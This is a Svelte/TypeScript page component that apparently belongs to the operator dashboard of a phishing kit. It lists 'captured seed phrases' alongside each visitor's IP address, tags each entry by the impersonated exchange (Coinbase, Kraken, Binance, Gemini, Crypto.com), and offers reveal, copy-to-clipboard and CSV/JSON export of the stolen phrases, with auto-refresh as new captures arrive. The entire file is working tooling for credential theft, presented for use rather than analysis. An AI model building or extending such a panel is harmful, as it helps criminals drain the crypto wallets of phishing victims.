<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Database,
		Search,
		RefreshCw,
		Eye,
		EyeOff,
		Copy,
		Check,
		Download,
		Filter,
		ToggleLeft,
		ToggleRight
	} from 'lucide-svelte';
	import Pagination from '$lib/components/Pagination.svelte';
	import SortableHeader from '$lib/components/SortableHeader.svelte';
	import ConnectionBadge from '$lib/components/ConnectionBadge.svelte';
	import { toast } from '$lib/stores/toast';
	import { MODULES } from '$lib/modules';

	interface Seed {
		id: string;
		visitorIp: string;
		flow: string;
		phrase: string;
		rawData: any;
		capturedBy: string;
		createdAt: number;
	}

	let rows: Seed[] = $state([]);
	let total = $state(0);
	let pageNum = $state(1);
	let limit = $state(20);
	let search = $state('');
	let moduleFilter = $state('');
	let status = $state('');
	let showPhrases = $state(false);
	let autoRefresh = $state(true);
	let loading = $state(false);
	let copiedId = $state<string | null>(null);
	let sortCol = $state<'created_at' | 'visitor_ip'>('created_at');
	let sortDir = $state<'asc' | 'desc'>('desc');
	let pollTimer: ReturnType<typeof setInterval> | null = null;

	async function fetchPage() {
		loading = true;
		try {
			const params = new URLSearchParams({
				page: String(pageNum),
				limit: String(limit),
				sort: sortCol,
				dir: sortDir
			});
			if (search.trim()) params.set('search', search.trim());
			if (moduleFilter) params.set('module', moduleFilter);
			if (status) params.set('status', status);
			const res = await fetch(`/api/seeds?${params}`);
			if (res.ok) {
				const data = await res.json();
				rows = data.rows;
				total = data.total;
			} else {
				toast.error('Failed to load seeds');
			}
		} finally {
			loading = false;
		}
	}

	let searchTimer: ReturnType<typeof setTimeout> | null = null;
	function onSearchInput() {
		if (searchTimer) clearTimeout(searchTimer);
		searchTimer = setTimeout(() => {
			pageNum = 1;
			fetchPage();
		}, 250);
	}

	$effect(() => {
		[pageNum, limit, sortCol, sortDir, moduleFilter, status];
		fetchPage();
	});

	onMount(() => {
		fetchPage();
		pollTimer = setInterval(() => {
			if (autoRefresh) fetchPage();
		}, 10000);
		return () => {
			if (pollTimer) clearInterval(pollTimer);
		};
	});

	function setSort(col: string) {
		const c = col as 'created_at' | 'visitor_ip';
		if (sortCol === c) sortDir = sortDir === 'asc' ? 'desc' : 'asc';
		else {
			sortCol = c;
			sortDir = 'desc';
		}
	}

	function maskPhrase(p: string): string {
		if (!p) return '—';
		const words = p.split(/\s+/).filter(Boolean);
		if (words.length === 0) return '—';
		return words.map(() => '•••').join(' ');
	}

	function copyPhrase(s: Seed) {
		navigator.clipboard?.writeText(s.phrase || '');
		copiedId = s.id;
		toast.success('Seed phrase copied to clipboard');
		setTimeout(() => (copiedId = null), 1200);
	}

	function fmtDate(ts: number): string {
		if (!ts) return '—';
		try {
			return new Date(ts).toLocaleString();
		} catch {
			return '—';
		}
	}

	function moduleFromFlow(flow: string): string {
		const lc = (flow || '').toLowerCase();
		if (lc.includes('vault')) return 'Coinbase Vault';
		if (lc.includes('coinbase')) return 'Coinbase';
		if (lc.includes('crypto')) return 'Crypto.com';
		if (lc.includes('gemini')) return 'Gemini';
		if (lc.includes('kraken')) return 'Kraken';
		if (lc.includes('binance')) return 'Binance';
		return flow || '—';
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300';
		if (lc.includes('kraken')) return 'bg-violet-500/15 text-violet-300';
		if (lc.includes('gemini')) return 'bg-cyan-500/15 text-cyan-300';
		if (lc.includes('binance')) return 'bg-amber-500/15 text-amber-300';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}

	function exportSeeds(format: 'csv' | 'json') {
		window.open(`/api/seeds/export?format=${format}`, '_blank');
	}
</script>

<svelte:head>
	<title>Seeds · Panel</title>
</svelte:head>

<div class="p-8 pt-5">
	<div class="mb-5 flex flex-wrap items-center justify-between gap-3">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Seeds</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Captured seed phrases — masked by default</p>
		</div>
		<div class="flex items-center gap-2">
			<ConnectionBadge />
			<button
				onclick={() => (autoRefresh = !autoRefresh)}
				aria-pressed={autoRefresh}
				aria-label="Toggle auto-refresh"
				class="flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-soft {autoRefresh ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
			>
				{#if autoRefresh}<ToggleRight size={12} />{:else}<ToggleLeft size={12} />{/if}
				Auto-refresh: {autoRefresh ? 'On' : 'Off'}
			</button>
			<button onclick={fetchPage} aria-label="Refresh seeds" class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
				<RefreshCw size={12} class={loading ? 'animate-spin' : ''} />
				Refresh
			</button>
			<div class="flex items-center gap-1 rounded-lg border border-[var(--border)] p-0.5">
				<button onclick={() => exportSeeds('csv')} aria-label="Export seeds as CSV" class="flex items-center gap-1 rounded-md px-2 py-1 text-[11px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
					<Download size={11} />
					CSV
				</button>
				<button onclick={() => exportSeeds('json')} aria-label="Export seeds as JSON" class="flex items-center gap-1 rounded-md px-2 py-1 text-[11px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
					<Download size={11} />
					JSON
				</button>
			</div>
		</div>
	</div>

	<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
		<div class="border-b border-[var(--border)] px-5 py-3 flex items-center justify-between gap-3 flex-wrap">
			<div class="flex items-center gap-2">
				<Database size={14} class="text-[var(--text-accent)]" />
				<p class="text-sm font-semibold text-[var(--foreground)]">Seeds Database</p>
				<span class="rounded-md bg-[var(--accent-primary)]/10 px-2 py-0.5 text-[10px] font-bold text-[var(--text-accent)]">{total}</span>
			</div>
			<div class="flex items-center gap-2">
				<div class="relative">
					<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
					<input
						type="text"
						bind:value={search}
						oninput={onSearchInput}
						placeholder="Search by IP, user ID or phrase..."
						class="w-72 rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
					/>
				</div>
				<select bind:value={moduleFilter} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
					<option value="">All Modules</option>
					{#each MODULES as m}
						<option value={m.seedToken}>{m.label}</option>
					{/each}
				</select>
				<select bind:value={status} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
					<option value="">All Status</option>
					<option value="active">Active</option>
				</select>
				<button
					onclick={() => (showPhrases = !showPhrases)}
					class="flex items-center gap-1.5 rounded-md border px-3 py-1.5 text-xs transition-soft {showPhrases ? 'border-amber-500/30 bg-amber-500/10 text-amber-300' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
					title="Toggle phrase masking"
				>
					{#if showPhrases}<EyeOff size={12} />{:else}<Eye size={12} />{/if}
					{showPhrases ? 'Hide Phrases' : 'Show Phrases'}
				</button>
			</div>
		</div>

		<div class="overflow-x-auto custom-scrollbar">
		<div class="min-w-[800px]">
		<div class="grid grid-cols-[minmax(0,1.4fr)_minmax(0,2fr)_140px_100px_minmax(0,1fr)] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2">
			<SortableHeader label="IP Address" column="visitor_ip" activeColumn={sortCol} direction={sortDir} onsort={setSort} />
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Seed Phrase</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Module</span>
			<span class="text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Status</span>
			<SortableHeader label="Captured" column="created_at" activeColumn={sortCol} direction={sortDir} onsort={setSort} />
		</div>

		{#if rows.length === 0}
			<div class="flex flex-col items-center justify-center py-16 text-center">
				<Database size={36} class="mb-2 text-[var(--text-tertiary)]" />
				<p class="text-sm font-semibold text-[var(--foreground)]">No seeds captured yet</p>
				<p class="mt-1 text-xs text-[var(--muted-foreground)]">Phrases captured via the ingestion API will appear here.</p>
			</div>
		{:else}
			<div class="max-h-[64vh] overflow-y-auto custom-scrollbar">
				{#each rows as s (s.id)}
					<div class="grid grid-cols-[minmax(0,1.4fr)_minmax(0,2fr)_140px_100px_minmax(0,1fr)] items-start gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
						<div class="min-w-0">
							<p class="truncate font-mono text-xs font-semibold text-[var(--foreground)]">{s.visitorIp}</p>
							<p class="mt-0.5 font-mono text-[10px] text-[var(--text-tertiary)]">ID: {s.id}</p>
							{#if s.capturedBy}
								<p class="mt-0.5 text-[10px] text-[var(--text-tertiary)]">By: {s.capturedBy}</p>
							{/if}
						</div>
						<div class="min-w-0">
							<div class="flex items-start gap-2">
								<p class="break-all font-mono text-xs {showPhrases ? 'text-[var(--foreground)]' : 'text-[var(--muted-foreground)] tracking-wider'}">
									{showPhrases ? s.phrase || '—' : maskPhrase(s.phrase)}
								</p>
								{#if s.phrase}
									<button
										onclick={() => copyPhrase(s)}
										class="shrink-0 rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
										aria-label="Copy phrase"
									>
										{#if copiedId === s.id}
											<Check size={10} class="text-[var(--status-live)]" />
										{:else}
											<Copy size={10} />
										{/if}
									</button>
								{/if}
							</div>
						</div>
						<span class="inline-flex w-fit items-center rounded-md px-2 py-0.5 text-[11px] font-medium {moduleColor(moduleFromFlow(s.flow))}">
							{moduleFromFlow(s.flow)}
						</span>
						<span class="inline-flex w-fit items-center rounded-md border border-[var(--status-live)]/30 bg-[var(--status-live)]/10 px-2 py-0.5 text-[11px] font-medium text-[var(--status-live)]">
							Active
						</span>
						<span class="text-[11px] text-[var(--muted-foreground)]">{fmtDate(s.createdAt)}</span>
					</div>
				{/each}
			</div>
		{/if}
		</div>
		</div>

		<div class="border-t border-[var(--border)]">
			<Pagination
				page={pageNum}
				{total}
				{limit}
				label="seeds"
				onchange={(p) => (pageNum = p)}
			/>
		</div>
	</div>
</div>
